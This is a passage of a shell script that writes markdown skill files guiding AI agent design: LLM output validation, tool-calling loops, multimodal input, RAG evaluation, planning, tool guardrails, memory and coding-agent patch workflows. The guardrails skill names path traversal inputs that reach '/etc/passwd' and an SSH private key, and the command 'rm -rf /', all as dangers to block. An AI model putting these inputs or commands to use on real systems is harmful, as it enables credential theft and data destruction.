Raw text or parsed JSON from LLM, target schema definition, coercion rules, and fallback defaults.

## Instructions
1. Treat LLM Output as Untrusted `unknown` Input:
   - Never cast LLM output directly with TypeScript `as MyInterface` or Python `my_dict['field']`.
   - Run all generated objects through explicit schema parsers (Zod / Pydantic).
2. Apply Defensive Type Coercion:
   - LLMs frequently output numbers or booleans as strings (e.g., `"true"` instead of `true`, `"42"` instead of `42`).
   - Use Zod coercion (`z.coerce.number()`, `z.coerce.boolean()`, `z.coerce.date()`) to forgive formatting quirks without failing validation.
3. Provide Resilient Fallback Defaults:
   - Provide sensible defaults for optional or non-critical fields (`.default([])`, `.default(false)`) so missing optional fields do not fail the entire payload.
4. Normalize and Trim Text Fields:
   - Apply automatic string transformations: `.trim()`, collapsing multiple spaces, and converting empty strings `""` to `null` if appropriate.
5. Handle Enum Variations:
   - When extracting status enums, handle case variations by transforming inputs to lowercase before checking enum membership (`z.string().toLowerCase().pipe(z.enum(['pending', 'active', 'closed']))`).
6. Format Validation Errors for Machine Correction:
   - When validation fails, extract the path, received value, and expected type into an actionable error object that can be passed back to the model for self-correction.

## Constraints / Rules
- Never allow unvalidated LLM output to bypass runtime validation checks.
- Avoid throwing unhandled fatal exceptions on minor schema mismatches; return a structured Result type (`{ success: false, errors: [...] }`).
- Do not use loose schemas that accept arbitrary unknown keys (`z.record(z.any())`).

## Workflow
1. Define schema with coercion, transformations, and default values.
2. Clean raw text and parse JSON safely using `try/catch`.
3. Validate data using `.safeParse()`.
4. If validation succeeds, return strongly typed data.
5. If validation fails, return structured path errors for retry handling.

## Expected Output
Defensive schema validation utility in TypeScript or Python featuring automatic type coercion, string trimming, and structured error reporting.

## Validation Checklist
- [ ] Are LLM stringified numbers and booleans safely coerced?
- [ ] Are string outputs trimmed of extraneous whitespace?
- [ ] Are optional fields backed by sensible default values?
- [ ] Are enums normalized for case-insensitivity?
- [ ] Does validation return a safe Result object without crashing?

## Common Mistakes & Antipatterns
- Using `z.number()` without coercion, causing the validation to fail when the LLM outputs `"100"` instead of `100`.
- Throwing uncaught errors on malformed LLM outputs, crashing background queue worker processes.
- Assuming an LLM will never include extra keys, failing when the model helpfully adds an unexpected `"commentary"` field.

## Concrete Real-World Example
Scenario: An invoice data extraction pipeline crashes 15% of the time because the LLM outputs dates as `"2024-05-12T00:00:00Z"` and totals as `"$1,250.00"` strings instead of numbers.
Prompt: Create a robust Zod validation schema that coerces and cleans this LLM invoice extraction data.
Application: The AI designs a Zod schema with custom pre-processing that strips currency symbols, coerces string numbers to floats via `z.preprocess`, parses ISO date strings into Date objects, and defaults missing line items to an empty array.
EOF

cat << 'EOF' > skills/ai/tool-calling/robust-tool-use-architecture/SKILL.md
---
name: "robust-tool-use-architecture"
description: "Architecting reliable LLM tool-calling (function-calling) systems with strict JSON schema declarations, execution sandboxes, error feedback, and loop termination."
category: "ai"
subcategory: "tool-calling"
language: "python"
framework: "none"
technology: "tool-calling"
difficulty: "advanced"
tags: ["ai", "tool-calling", "function-calling", "agent-tools", "json-schema", "sandboxing"]
---

# Robust LLM Tool Calling, Schema Declarations, and Execution Loops

## Purpose
Instruct AI agents to author reliable tool-calling and function-calling loops that execute external tools safely, handle runtime tool failures gracefully, and prevent infinite tool execution loops.

## When to Use
Use when giving LLMs the ability to query databases, execute shell commands, call external REST APIs, or interact with filesystems.

## Inputs / Context
Tool definitions (name, description, parameters schema), execution dispatcher, LLM client, and max iteration limits.

## Instructions
1. Author High-Clarity Tool Schemas:
   - Provide detailed, unambiguous descriptions for the tool and every parameter. The description is the sole documentation the model receives to understand when and how to call the function.
   - Use JSON Schema (or Pydantic models) with strict property types, required parameter arrays, and descriptive enum values.
2. Sandboxed Tool Execution:
   - Execute tool functions in a safe environment with strict timeout limits (e.g., 10 seconds per tool call).
   - Catch and encapsulate all runtime tool exceptions; NEVER let a tool exception crash the agent loop.
3. Feed Tool Errors Back into the Model Context:
   - When a tool fails (e.g., invalid parameters, database connection timeout, missing file), return a structured tool error response back to the LLM:
     `{"status": "error", "error_type": "FileNotFound", "message": "File 'report.csv' not found. Available files: [...]"}`
   - This allows the model to introspect its error, adjust parameters, and self-correct on the next iteration.
4. Enforce Hard Loop Termination Guardrails:
   - Always enforce a maximum tool iteration limit (`MAX_ITERATIONS = 5` or `10`).
   - If the limit is reached without a final answer, terminate execution and return a graceful failure explanation to the user.
5. Prevent Duplicate / Infinite Tool Loops:
   - Track previously executed tool calls and parameters; if the model calls the exact same tool with the exact same arguments 3 times consecutively without progress, abort and alert the user.

## Constraints / Rules
- Never execute destructive tools (e.g., deleting a database or sending an email to a customer) without an explicit human-in-the-loop confirmation step.
- Never run tool-calling loops without a hard iteration cap.
- Do not let unhandled tool exceptions escape the execution dispatcher.

## Workflow
1. Define tools with Pydantic schemas and descriptive docstrings.
2. Register tools in a centralized registry map `dict[str, Callable]`.
3. Pass tool definitions to LLM in API request.
4. Inspect model response: if `tool_calls` present, execute tools safely.
5. Append tool results to message history and invoke LLM again until final response or max iterations reached.

## Expected Output
Complete, resilient tool-calling orchestration loop with schema generation, sandboxed execution, error feedback injection, and loop guardrails.

## Validation Checklist
- [ ] Are all tool parameters documented with explicit descriptions and types?
- [ ] Is tool execution wrapped in try/except blocks returning structured error messages?
- [ ] Is a hard maximum iteration cap enforced?
- [ ] Are duplicate identical tool call loops detected and interrupted?
- [ ] Are sensitive actions protected by confirmation gates?

## Common Mistakes & Antipatterns
- Omitting parameter descriptions, causing the model to guess argument formats and pass invalid types.
- Allowing an unhandled tool exception (like `NetworkTimeout`) to crash the Python process instead of returning an error message for the model to recover from.
- Running a `while True` loop without a max iteration count, running up huge API bills when the model gets stuck in an infinite tool cycle.

## Concrete Real-World Example
Scenario: An AI database assistant gets stuck in an infinite loop querying a table with slightly misspelled column names, racking up 50 failed API calls.
Prompt: Build a robust tool-calling dispatcher in Python that handles tool errors, suggests valid columns, and enforces max iteration limits.
Application: The AI implements a tool loop capped at 5 iterations, catches SQL column errors, returns `{"error": "column 'usr_name' not found. Did you mean 'username'?"}` as the tool response, allowing the model to correct its query on turn 2 and produce the correct result.
EOF

cat << 'EOF' > skills/ai/multimodal/vision-audio-context-orchestration/SKILL.md
---
name: "vision-audio-context-orchestration"
description: "Orchestrating multimodal LLM workflows incorporating high-resolution image analysis, audio transcripts, bounding box spatial grounding, and token budgeting."
category: "ai"
subcategory: "multimodal"
language: "python"
framework: "none"
technology: "multimodal-ai"
difficulty: "advanced"
tags: ["ai", "multimodal", "vision", "audio", "spatial-grounding", "bounding-boxes", "token-budgeting"]
---

# Multimodal Context Orchestration for Vision and Audio

## Purpose
Instruct AI agents to author applications that seamlessly combine text, high-resolution imagery, and audio streams, managing token costs and extracting spatially grounded insights.

## When to Use
Use when analyzing charts/diagrams, inspecting UI screenshots, processing scanned documents/receipts, or building multimodal voice assistants.

## Inputs / Context
Image/audio assets (URLs, Base64 buffers), prompt query, resolution budget, and expected output schema.

## Instructions
1. Image Pre-Processing and Token Budgeting:
   - High-resolution images consume large token counts (e.g., 1,000+ tokens per 1024x1024 image tile).
   - Resize images to standard maximum bounds (e.g., 1568px on longest edge) and convert to WebP or JPEG before sending to the model; never send uncompressed 50MB RAW or TIFF files.
   - Select detail level (`detail: "low"` for general classification, `detail: "high"` for small text/OCR).
2. Spatial Grounding and Normalized Bounding Boxes:
   - When asking multimodal models to locate objects, require normalized coordinates on a 0-1000 scale: `[ymin, xmin, ymax, xmax]`.
   - Normalized coordinates remain resolution-independent and allow frontend UI components to overlay highlight boxes accurately across responsive viewports.
3. Multi-Image Comparison and Sequence Context:
   - When presenting multiple images (e.g., before-and-after UI diffs, time-series camera frames), explicitly label each image in the message array: `Image 1: Baseline UI (v1.0)`, `Image 2: Modified UI (v1.1)`.
4. Audio Processing and Timestamp Grounding:
   - For audio workflows, transcribe audio with word-level or sentence-level timestamps (e.g., via Whisper).
   - Feed timestamps into the multimodal prompt context to enable precise audio-scrubbing links in the output response.
5. Handle Unreadable / Degraded Media Gracefully:
   - Instruct the model to report image blur, occlusion, or audio clipping explicitly rather than hallucinating illegible text.

## Constraints / Rules
- Never pass raw, uncompressed high-resolution images (> 20MB) to multimodal API endpoints.
- Do not ask models for pixel-exact coordinates without specifying the reference coordinate system.
- Avoid passing 50 images in a single request without verifying model context window limits.

## Workflow
1. Ingest image/audio and resize/compress to target token budget.
2. Encode image to Base64 data URL or upload to object storage.
3. Formulate prompt requesting normalized bounding boxes or timestamped audio extraction.
4. Parse structured vision response into domain models.
5. Render visual overlays on original media.

## Expected Output
Multimodal API integration pipeline supporting image optimization, normalized spatial bounding box extraction, and timestamped audio synthesis.

## Validation Checklist
- [ ] Are images resized and optimized before API transmission?
- [ ] Are spatial bounding boxes requested using normalized 0-1000 coordinates?
- [ ] Are multiple images labeled sequentially in the prompt context?
- [ ] Is token consumption calculated and bounded?
- [ ] Does the system gracefully flag unreadable or occluded media?

## Common Mistakes & Antipatterns
- Sending a 4000x3000 photo of a receipt, consuming thousands of tokens and timing out the HTTP request.
- Asking 'Where is the button?' without requesting normalized coordinates, receiving a vague text answer like 'in the upper middle' instead of programmatic coordinates.
- Assuming an audio transcription contains accurate speaker diarization without explicit multi-channel or diarization modeling.

## Concrete Real-World Example
Scenario: A quality assurance agent inspects automated UI screenshots to verify that an error alert banner appears when a login fails.
Prompt: Write a Python function using a multimodal LLM to detect the error banner and return its exact bounding box.
Application: The AI optimizes the screenshot to WebP, submits it with a schema requiring `banner_present: bool`, `error_text: str`, and `box_2d: [ymin, xmin, ymax, xmax]`, and verifies that the returned coordinates match the UI alert box.
EOF

cat << 'EOF' > skills/ai/ai-evaluation/ragas-and-groundedness-benchmarking/SKILL.md
---
name: "ragas-and-groundedness-benchmarking"
description: "Systematic evaluation of LLM and RAG applications using automated benchmarks, synthetic evaluation datasets, groundedness scoring, and Ragas metrics."
category: "ai"
subcategory: "ai-evaluation"
language: "python"
framework: "none"
technology: "ai-evaluation"
difficulty: "advanced"
tags: ["ai", "evaluation", "benchmarking", "ragas", "groundedness", "faithfulness", "hallucination"]
---

# LLM Evaluation, Groundedness Benchmarking, and Ragas Metrics

## Purpose
Provide AI agents with rigorous evaluation methodologies to benchmark LLM outputs, detect regressions, and mathematically measure faithfulness and relevance.

## When to Use
Use when evaluating RAG pipelines, comparing different LLM models, validating prompt revisions, or setting up automated CI/CD quality gates for AI features.

## Inputs / Context
Evaluation dataset (questions, ground truth answers, retrieved contexts, generated answers), evaluation framework (Ragas, TruLens), and scoring thresholds.

## Instructions
1. Evaluate Across the Four Fundamental RAG Metrics (The RAG Triad):
   - Faithfulness (Groundedness): Measures whether the generated answer is mathematically grounded in the retrieved context. Are there claims in the answer that do not exist in the context? (Eliminates hallucinations).
   - Answer Relevance: Measures whether the generated response directly answers the user's initial question (Eliminates evasive or off-topic responses).
   - Context Precision: Measures whether the relevant chunks are ranked at the very top of the retrieved context list.
   - Context Recall: Measures whether all information required to answer the question was successfully retrieved from the knowledge base.
2. Build Golden Evaluation Datasets:
   - Curate a representative dataset of 50-200 realistic test questions with verified ground-truth answers and expected source document references.
   - Include adversarial questions (unanswerable questions, out-of-domain queries) to verify refusal behavior.
3. Automated LLM-as-a-Judge Evaluation:
   - Use a high-capability judge model (e.g., GPT-4 or Claude 3.5 Sonnet) with strict scoring rubrics to evaluate candidate answers.
   - Chain evaluation steps: break candidate answers into atomic statements and verify each statement individually against the retrieved context to calculate an exact faithfulness score between 0.0 and 1.0.
4. Establish CI/CD Quality Gates:
   - Integrate evaluation runs into pull request pipelines: fail the build if a prompt or model change drops faithfulness below 0.90 or relevance below 0.85.

## Constraints / Rules
- Never evaluate models solely on anecdotal 'vibe checks' across 2-3 sample queries.
- Never use the same model family as both the generator and the judge without blinding and score verification.
- Do not deploy prompt changes to production without running the full golden evaluation test suite.

## Workflow
1. Assemble golden evaluation dataset with questions, ground truths, and source docs.
2. Execute candidate RAG pipeline to generate answers and captured context.
3. Compute Faithfulness, Relevance, Precision, and Recall scores.
4. Generate comparative evaluation report highlighting regressions.
5. Block deployment if quality thresholds are breached.

## Expected Output
Automated evaluation script calculating Ragas metrics, generating Markdown scorecards, and enforcing regression pass/fail thresholds in CI.

## Validation Checklist
- [ ] Are Faithfulness (Groundedness) and Answer Relevance measured independently?
- [ ] Is Context Precision and Context Recall evaluated on the retrieval step?
- [ ] Does the evaluation dataset include unanswerable/adversarial queries?
- [ ] Are scores tracked quantitatively on a 0.0 - 1.0 scale?
- [ ] Is evaluation automated as a quality gate in CI?

## Common Mistakes & Antipatterns
- Tweaking a system prompt to fix one specific customer complaint, unwittingly breaking 15 other use cases because no regression test suite was executed.
- Evaluating only the final answer without measuring whether the retrieval step found the correct documents (conflating retrieval bugs with generation bugs).
- Giving the judge model vague scoring instructions ('rate 1 to 5'), producing noisy, non-reproducible evaluation scores.

## Concrete Real-World Example
Scenario: An engineering team updates their RAG chunking strategy but has no quantitative way to know if the new version is more accurate than the old one.
Prompt: Build an automated evaluation script using Ragas to benchmark this RAG pipeline's faithfulness and context recall.
Application: The AI creates a benchmark runner executing 100 test cases, computes Faithfulness, Answer Relevance, and Context Recall scores using Ragas, formats the results into a markdown comparison table, and asserts that Faithfulness >= 0.92 before allowing deployment.
EOF

cat << 'EOF' > skills/agents/planning/rewoo-task-decomposition/SKILL.md
---
name: "rewoo-task-decomposition"
description: "Architecting reliable AI agents using Reasoning without Observation (ReWOO), plan-first task decomposition, dependency DAGs, and deterministic execution."
category: "agents"
subcategory: "planning"
language: "python"
framework: "none"
technology: "agent-planning"
difficulty: "advanced"
tags: ["agents", "planning", "rewoo", "decomposition", "dag", "orchestration"]
---

# Agent Planning, ReWOO Decomposition, and Dependency Graphs

## Purpose
Instruct AI agents to execute complex, multi-step engineering tasks by first decomposing the objective into an upfront execution plan and dependency DAG before triggering tool calls.

## When to Use
Use when architecting autonomous software agents, multi-step research assistants, complex code migration agents, or data analysis pipelines.

## Inputs / Context
High-level user goal, available tool registry, environment constraints, and intermediate variable dependencies.

## Instructions
1. Adopt the ReWOO (Reasoning without Observation) Architecture:
   - Step 1 (Planner): Generates a complete blueprint of sub-tasks and tool calls upfront, modeling intermediate results as symbolic variables (`#E1`, `#E2`, `#E3`) without executing them.
   - Step 2 (Worker): Executes the planned tool calls in parallel or sequence, substituting resolved outputs into downstream variable placeholders.
   - Step 3 (Solver): Synthesizes the aggregated tool outputs into the final deliverable.
   - Why ReWOO > ReAct: Standard ReAct (Reason-Act-Observe loops) incurs massive token latency and frequently gets lost or derails after 5 iterations; ReWOO creates an explicit execution DAG upfront, reducing API calls by 50% and improving reliability.
2. Structure the Plan as a Dependency DAG:
   - Identify independent tasks that can be executed in parallel (e.g., querying GitHub issues and reading documentation simultaneously).
   - Sequence dependent tasks where output `#E1` is a required input for task `#E2`.
3. Validate Plan Feasibility Before Execution:
   - Ensure every required variable has a corresponding upstream tool producer.
   - Detect and prevent circular dependencies in the plan.
4. Implement Dynamic Plan Re-Evaluation on Critical Failure:
   - If a worker step encounters an unrecoverable failure, invoke the Planner to revise the remaining unfinished nodes in the DAG rather than aborting the entire mission.

## Constraints / Rules
- Never begin executing tools before generating and validating the explicit task decomposition plan.
- Avoid unstructured ReAct loops for tasks requiring more than 4 distinct sequential steps.
- Do not create plans with unresolvable circular variable references.

## Workflow
1. Planner receives goal and produces plan lines with `#E` variable placeholders.
2. Parse plan lines into an executable Directed Acyclic Graph (DAG).
3. Workers execute independent tasks concurrently.
4. Substitute resolved variable values into downstream tasks.
5. Solver synthesizes all `#E` outputs into the final response.

## Expected Output
Modular ReWOO planning engine implementation with step parsing, variable substitution, parallel worker execution, and final solver synthesis.

## Validation Checklist
- [ ] Is an upfront execution plan generated before running tools?
- [ ] Are intermediate outputs modeled as variable placeholders (`#E1`, `#E2`)?
- [ ] Are independent tasks identified and executed in parallel?
- [ ] Is plan execution resilient to individual tool timeouts?
- [ ] Does the solver produce a coherent final answer synthesizing all outputs?

## Common Mistakes & Antipatterns
- Using raw ReAct loops for a 10-step migration, watching the agent enter a hallucinated loop after step 4 because conversation context became too noisy.
- Generating a plan where step 3 requires output from step 4 (unresolvable forward reference).
- Executing all steps sequentially even when 3 independent searches could have been performed in parallel.

## Concrete Real-World Example
Scenario: An autonomous engineering agent is tasked with diagnosing a bug, checking git blame, reviewing recent PRs, and proposing a patch.
Prompt: Implement a ReWOO planning structure for this bug diagnosis agent.
Application: The AI creates a Planner generating `#E1 = SearchLogs()`, `#E2 = ReadSourceFile()`, `#E3 = GitBlame(#E2)`, `#E4 = SearchPRs(#E3)`, executes `#E1` and `#E2` in parallel, chains `#E3` and `#E4`, and feeds all outputs to a Solver that writes the verified bug report and patch.
EOF

cat << 'EOF' > skills/agents/tool-use/autonomous-tool-selection-guardrails/SKILL.md
---
name: "autonomous-tool-selection-guardrails"
description: "Governing autonomous AI agent tool selection, dynamic parameter validation, permission gates, execution sandboxes, and rate-limiting guardrails."
category: "agents"
subcategory: "tool-use"
language: "python"
framework: "none"
technology: "agent-tools"
difficulty: "advanced"
tags: ["agents", "tool-use", "guardrails", "security", "sandboxing", "permissions"]
---

# Autonomous Tool Selection, Parameter Validation, and Safety Guardrails

## Purpose
Provide AI agents with robust safety frameworks to govern how autonomous systems select, validate, and execute external tools without causing data loss or security breaches.

## When to Use
Use when deploying coding agents, workflow automation agents, cloud management bots, or multi-tool autonomous systems.

## Inputs / Context
Tool definitions, user permission context, execution policies, parameter schemas, and environmental sandboxes.

## Instructions
1. Multi-Tier Permission Hierarchy:
   - Tier 1 (Read-Only / Safe): Autonomous execution permitted without user confirmation (e.g., `read_file`, `search_code`, `get_status`).
   - Tier 2 (Idempotent / Low-Risk Mutation): Autonomous execution with logging and automatic rollback support (e.g., `create_scratch_file`, `run_unit_test`).
   - Tier 3 (Destructive / High-Risk Mutation): Strictly requires explicit human-in-the-loop confirmation before execution (e.g., `delete_file`, `git_push_force`, `drop_table`, `send_email`).
2. Pre-Execution Parameter Validation:
   - Validate tool parameters against strict Pydantic schemas before invocation.
   - Enforce path sandboxing: verify file paths do not traverse outside the designated workspace directory (`os.path.commonpath` verification to prevent `../../etc/passwd` path traversal).
3. Tool Execution Sandboxing:
   - Execute shell and code commands in isolated containerized sandboxes or restricted subprocesses with strict CPU, memory, and timeout caps (e.g., max 30s).
   - Prohibit interactive commands that block awaiting stdin without a terminal (e.g., `vim`, `nano`, unflagged `apt-get install`).
4. Rate Limiting and Cost Guardrails:
   - Cap maximum tool calls per task (e.g., max 25 calls).
   - Cap total monetary API spend or token consumption per session.

## Constraints / Rules
- Never execute Tier 3 destructive operations without explicit human authorization.
- Never execute shell commands with root privileges.
- Do not allow file operations outside the designated workspace sandbox.

## Workflow
1. Agent selects tool and generates arguments.
2. Validate arguments against Pydantic schema and sandbox constraints.
3. Check permission tier: if Tier 3, prompt user for approval.
4. Execute tool in sandboxed subprocess with timeout.
5. Sanitize tool output and return to agent context.

## Expected Output
Safe tool execution engine featuring permission tier routing, path traversal sandboxing, human confirmation prompts, and timeout handling.

## Validation Checklist
- [ ] Are tools classified into clear safety tiers?
- [ ] Are destructive actions gated by human confirmation?
- [ ] Is path traversal strictly prevented on filesystem tools?
- [ ] Are subprocess tools constrained by execution timeouts?
- [ ] Are total session tool calls and costs capped?

## Common Mistakes & Antipatterns
- Giving an agent a generic `execute_bash` tool with root access, allowing it to accidentally run `rm -rf /` or overwrite system files.
- Allowing an agent to read arbitrary paths on the host system via `../../.ssh/id_rsa`.
- Omitting timeouts on tool calls, causing the entire agent process to hang forever when a script waits for user input.

## Concrete Real-World Example
Scenario: An autonomous coding agent attempts to clean up temporary files and generates a command to delete the entire project directory due to a variable expansion bug.
Prompt: Implement safety guardrails and permission gates for this coding agent's filesystem tools.
Application: The AI creates a `SafeToolRunner` enforcing path containment within `/workspace`, flags all deletion operations as Tier 3 requiring human confirmation, validates arguments via Pydantic, and prevents execution outside the approved directory.
EOF

cat << 'EOF' > skills/agents/memory/short-and-long-term-context-compaction/SKILL.md
---
name: "short-and-long-term-context-compaction"
description: "Architecting tiered AI agent memory systems combining short-term working buffers, recursive context compaction, and long-term vector-backed episodic memory."
category: "agents"
subcategory: "memory"
language: "python"
framework: "none"
technology: "agent-memory"
difficulty: "advanced"
tags: ["agents", "memory", "context-compaction", "summarization", "episodic-memory", "vector-store"]
---

# Agent Memory Architecture, Context Compaction, and Semantic Recall

## Purpose
Instruct AI agents to author scalable memory systems that enable agents to maintain context across 100+ conversation turns without exceeding context windows or degrading reasoning quality.

## When to Use
Use when building long-running customer support agents, persistent coding assistants, multi-day workflow coordinators, or roleplaying companions.

## Inputs / Context
Message stream, token budget limit, vector store connection, summarization model, and entity extraction rules.

## Instructions
1. Implement Tiered Memory Architecture:
   - Working Memory (Short-Term): The most recent N messages (e.g., last 10-15 turns) retained verbatim in the context window.
   - Compacted Memory (Medium-Term): A running structured summary of older conversation turns, capturing decisions made, user preferences, and unresolved tasks.
   - Episodic / Semantic Memory (Long-Term): Key facts, user entity profiles, and past session summaries stored in a vector database and retrieved on-demand via semantic search.
2. Recursive Context Compaction Algorithm:
   - Monitor total token consumption. When conversation history reaches 75% of context window capacity:
     * Split history into: Old Turns (to be compacted) and Recent Turns (to retain verbatim).
     * Invoke a fast summarization prompt to condense Old Turns into a structured markdown state block:
       `<state_summary>`
       - User Goals: ...
       - Decisions Made: ...
       - Completed Tasks: ...
       - Pending Items: ...
       `</state_summary>`
     * Replace Old Turns with the compact `<state_summary>`, freeing up 70% of context space.
3. Long-Term Memory Extraction and Storage:
   - Asynchronously extract long-term user facts (e.g., 'User prefers TypeScript over JavaScript', 'User timezone is UTC+2') and upsert into a vector store with entity tags.
4. Dynamic Context Assembly:
   - On each incoming user turn, retrieve top-3 relevant facts from Long-Term Memory, prepend the Compacted Memory summary, and append the Working Memory turns.

## Constraints / Rules
- Never discard conversation history blindly without summarizing key decisions and pending tasks.
- Never store raw credentials or sensitive personal information in long-term memory.
- Avoid running context compaction synchronously during user request generation; compact proactively in background tasks.

## Workflow
1. Track token count on each conversation turn.
2. If token threshold is crossed, trigger context compaction.
3. Summarize older turns into a structured state block.
4. Extract long-term user facts and index into vector store.
5. Reconstruct context window with summary + recent turns.

## Expected Output
Modular agent memory manager implementing working memory buffering, automatic background context compaction, and vector episodic retrieval.

## Validation Checklist
- [ ] Does working memory preserve recent turns verbatim?
- [ ] Does context compaction retain critical decisions and pending tasks?
- [ ] Are long-term facts stored in vector memory with semantic retrieval?
- [ ] Is total prompt token size bounded regardless of session length?
- [ ] Can the agent remember decisions made 50 turns earlier?

## Common Mistakes & Antipatterns
- Using a naive FIFO sliding window that truncates the oldest 5 messages, immediately forgetting the user's primary instructions given in message 1.
- Writing vague, conversational summaries ('We talked about code') that lose exact variable names, file paths, and architectural decisions.
- Stuffing all past session memories into the context window simultaneously, triggering massive token costs and context confusion.

## Concrete Real-World Example
Scenario: A coding assistant forgets the user's architectural guidelines after 20 turns of code debugging because the initial prompt scrolled out of the context window.
Prompt: Build an automated context compaction and memory management system for this coding agent.
Application: The AI implements a `MemoryManager` that monitors token usage, compacts turns 1-15 into a concise `<project_state>` block capturing the architecture guidelines and fixed bugs, preserves turns 16-20 verbatim, maintaining full context coherence across 100+ turns.
EOF

cat << 'EOF' > skills/agents/workflows/directed-acyclic-graph-orchestration/SKILL.md
---
name: "directed-acyclic-graph-orchestration"
description: "Orchestrating complex multi-agent workflows using stateful Directed Acyclic Graphs (DAGs), conditional branching, human review checkpoints, and state persistence."
category: "agents"
subcategory: "workflows"
language: "python"
framework: "none"
technology: "workflow-dag"
difficulty: "advanced"
tags: ["agents", "workflows", "dag", "state-machine", "orchestration", "human-in-the-loop"]
---

# Agent Workflow Orchestration with Directed Acyclic Graphs (DAGs)

## Purpose
Instruct AI agents to author structured, reliable agent workflows modeled as stateful Directed Acyclic Graphs (similar to LangGraph) with explicit state transitions and human-in-the-loop gates.

## When to Use
Use when coordinating multi-step software release pipelines, content generation review cycles, complex customer onboarding, or multi-stage data ETL.

## Inputs / Context
Workflow nodes (agent functions), edges (transitions), state schema, conditional routing logic, and checkpoint storage.

## Instructions
1. Model Workflows as Explicit State Graphs:
   - Define a centralized, immutable `AgentState` schema (using Pydantic or TypedDict) passed between all nodes in the graph.
   - Nodes: Pure or async functions that take `AgentState`, execute an agent or tool action, and return a dictionary of state updates.
   - Edges: Explicit transition paths connecting nodes.
2. Support Conditional Branching:
   - Use Conditional Edges: A router function evaluates current state and returns the name of the next destination node (e.g., `if state['quality_score'] < 0.8: return 'refine_draft'; else: return 'publish'`).
3. Checkpoint State Persistence:
   - Save the complete graph state to a persistent database (Postgres/Redis) after every node execution.
   - Enables time-travel debugging, session resumption across server restarts, and auditability.
4. Integrate Human-in-the-Loop Interrupts:
   - Define Interrupt Gates: Pause graph execution before entering high-risk nodes (e.g., `DeployToProdNode`), persist state, and wait for human approval or feedback input before resuming.
5. Cycle Prevention and Loop Limits:
   - For cyclical workflows (e.g., draft -> review -> refine -> review), enforce a strict `max_revisions` counter in the state to prevent infinite refinement loops.

## Constraints / Rules
- Never allow workflows to cycle indefinitely without a hard iteration limit.
- Do not store un-serializable objects (like open network sockets or active threads) in the workflow state.
- Avoid building monolithic nodes that perform multiple unrelated agent tasks in a single function.

## Workflow
1. Define shared `AgentState` schema.
2. Implement atomic node functions returning state patches.
3. Define standard and conditional edge routing rules.
4. Attach state checkpointer for persistence.
5. Execute graph and verify state transitions and termination conditions.

## Expected Output
Modular DAG workflow engine implementation with state persistence, conditional branching, human-in-the-loop pauses, and loop guardrails.

## Validation Checklist
- [ ] Is shared state defined using a strongly typed schema?
- [ ] Are nodes implemented as modular functions returning state updates?
- [ ] Do cyclical refinement paths enforce a maximum iteration limit?
- [ ] Can workflow state be paused for human approval and resumed cleanly?
- [ ] Is state persisted at checkpoints between node transitions?

## Common Mistakes & Antipatterns
- Writing cyclical agent loops (draft -> review -> draft) without a loop counter, causing the agent to burn through $50 of API credits refining a comma.
- Mutating global state across nodes instead of returning explicit state patches, causing race conditions in parallel branches.
- Losing all workflow progress when the server restarts because state was kept only in local memory.

## Concrete Real-World Example
Scenario: A technical blog publishing workflow needs to generate an outline, write content, review technical accuracy, and require human editor approval before publishing.
Prompt: Build a stateful DAG workflow for this technical content publishing pipeline in Python.
Application: The AI defines an `ArticleState` TypedDict, creates nodes for `Outline`, `Draft`, `Review`, and `Publish`, routes through a conditional edge that returns to `Draft` if review score < 8 (capped at 2 revisions), pauses at an approval interrupt gate before `Publish`, and persists state in SQLite.
EOF

cat << 'EOF' > skills/agents/coding-agents/patch-generation-and-test-validation/SKILL.md
---
name: "patch-generation-and-test-validation"
description: "Engineering autonomous coding agent loops that inspect codebases, generate unified diff patches, execute test suites, and iteratively repair broken tests."
category: "agents"
subcategory: "coding-agents"
language: "python"
framework: "none"
technology: "coding-agents"
difficulty: "advanced"
tags: ["agents", "coding-agents", "git-patch", "unified-diff", "test-validation", "code-repair"]
---

# Autonomous Coding Agent Patch Generation and Test Validation

## Purpose
Provide AI agents with rigorous engineering protocols for discovering code contexts, generating standard Git unified diffs, running automated test suites, and validating patches.

## When to Use
Use when building AI software engineer agents (like SWE-bench style agents), automated bug-fix bots, or automated refactoring pipelines.

## Inputs / Context
Bug description / issue text, project repository directory, test command (`pytest`, `npm test`), and Git diff tools.

## Instructions
1. Context Discovery and Localization:
   - Search the codebase using keyword search, symbol references, and file trees to locate the minimal set of files responsible for the issue.
   - Do NOT load entire repositories into context; inspect only relevant files and functions.
2. Reproduce the Defect First:
   - Before modifying application source code, write a reproduction test case that reliably reproduces the reported bug.
   - Execute the test suite and confirm the reproduction test FAILS with the expected assertion error.
3. Generate Minimal Unified Diffs (Git Patches):
   - Instruct the agent to generate changes in standard Git Unified Diff format (`diff --git a/... b/...`) or targeted file replacements.
   - Apply edits conservatively: do not reformat unrelated lines or change code style conventions.
4. Execute Test Validation Loop:
   - Apply the patch to the working tree.
   - Run the automated test suite.
   - If the reproduction test passes AND all existing regression tests pass: the patch is verified.
   - If tests fail: capture the compiler/test error output, feed it back to the agent, and iteratively refine the patch (capped at 3 repair iterations).
5. Clean Up and Commit:
   - Ensure the patch leaves zero temporary debug files, print statements, or commented-out code.
   - Format a clean Git commit message following Conventional Commits (`fix(auth): ...`).

## Constraints / Rules
- Never declare a bug fixed without running the automated test suite.
- Never modify unrelated files or reformat the entire codebase in a bug-fix patch.
- Do not bypass failing tests by deleting or disabling existing assertions.

## Workflow
1. Analyze issue description and localize relevant source files.
2. Author and run a failing reproduction test.
3. Formulate minimal bug fix and apply patch to files.
4. Run full test suite to verify fix and absence of regressions.
5. If tests fail, feed error trace to agent for iteration.
6. Commit verified patch with clean commit message.

## Expected Output
Autonomous coding agent loop implementation capable of issue localization, patch generation, test execution, and iterative error repair.

## Validation Checklist
- [ ] Does the agent author a reproduction test before fixing the bug?
- [ ] Is the patch restricted to minimal necessary changes?
- [ ] Does the patch pass the full regression test suite?
- [ ] Are test failure outputs fed back into an iterative repair loop?
- [ ] Are temporary debug logs and files completely removed before commit?

## Common Mistakes & Antipatterns
- Modifying 15 unrelated files to fix a 1-line bug, introducing merge conflicts and unintended regressions.
- 'Fixing' a bug by modifying the test assertion to expect the broken behavior instead of fixing the application code.
- Failing to verify that the reproduction test actually failed before applying the patch.

## Concrete Real-World Example
Scenario: A Python pricing calculator has a rounding error bug reported in an issue ticket.
Prompt: Run an autonomous coding agent loop to locate, reproduce, fix, and verify this rounding defect.
Application: The AI searches for calculation functions, authors a failing test `test_proration_rounding` in `tests/test_pricing.py`, confirms it fails with `AssertionError: 99.99 != 100.00`, modifies the rounding logic in `pricing.py`, re-runs pytest, verifies all 42 tests pass, and outputs a clean Git unified diff.
EOF

